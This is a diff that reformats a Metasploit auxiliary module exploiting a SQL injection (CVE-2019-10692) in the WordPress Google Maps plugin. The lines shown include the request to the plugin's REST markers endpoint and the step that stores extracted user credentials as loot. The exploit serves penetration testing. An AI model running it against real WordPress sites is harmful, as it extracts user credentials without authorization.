@@ -8,8 +8,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(
-      'Name'            => 'WordPress Google Maps Plugin SQL Injection',
-      'Description'     => %q{
+      'Name' => 'WordPress Google Maps Plugin SQL Injection',
+      'Description' => %q{
         This module exploits a SQL injection vulnerability in a REST endpoint
         registered by the WordPress plugin wp-google-maps between 7.11.00 and
         7.11.17 (included).
@@ -17,29 +17,28 @@ class MetasploitModule < Msf::Auxiliary
         As the table prefix can be changed by administrators, set DB_PREFIX
         accordingly.
       },
-      'Author'          =>
-        [
-          'Thomas Chauchefoin (Synacktiv)', # Vulnerability discovery, Metasploit module
-        ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
-          ['CVE', '2019-10692'],
-          ['WPVDB', '9249']
-        ],
-      'DisclosureDate'  => '2019-04-02'
+      'Author' => [
+        'Thomas Chauchefoin (Synacktiv)', # Vulnerability discovery, Metasploit module
+      ],
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['CVE', '2019-10692'],
+        ['WPVDB', '9249']
+      ],
+      'DisclosureDate' => '2019-04-02'
     )
 
     register_options(
       [
         OptString.new('DB_PREFIX', [true, 'WordPress table prefix', 'wp_'])
-      ])
+      ]
+    )
   end
 
   def send_sql_request(sql_query)
     res = send_request_cgi(
-      'method'   => 'GET',
-      'uri'      => normalize_uri(target_uri.path),
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path),
       'vars_get' => {
         'rest_route' => '/wpgmza/v1/markers',
         'filter' => '{}',
@@ -48,6 +47,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     return nil if res.nil? || res.code != 200 || res.body.nil?
+
     res.body
   end
 
@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
     if body.empty?
       print_error("#{peer} - Failed to retrieve the table #{datastore['DB_PREFIX']}users")
     else
-      loot = store_loot("wp_google_maps.json","application/json", rhost, body.to_s)
+      loot = store_loot("wp_google_maps.json", "application/json", rhost, body.to_s)
       print_good("Credentials saved in: #{loot}")
     end
 
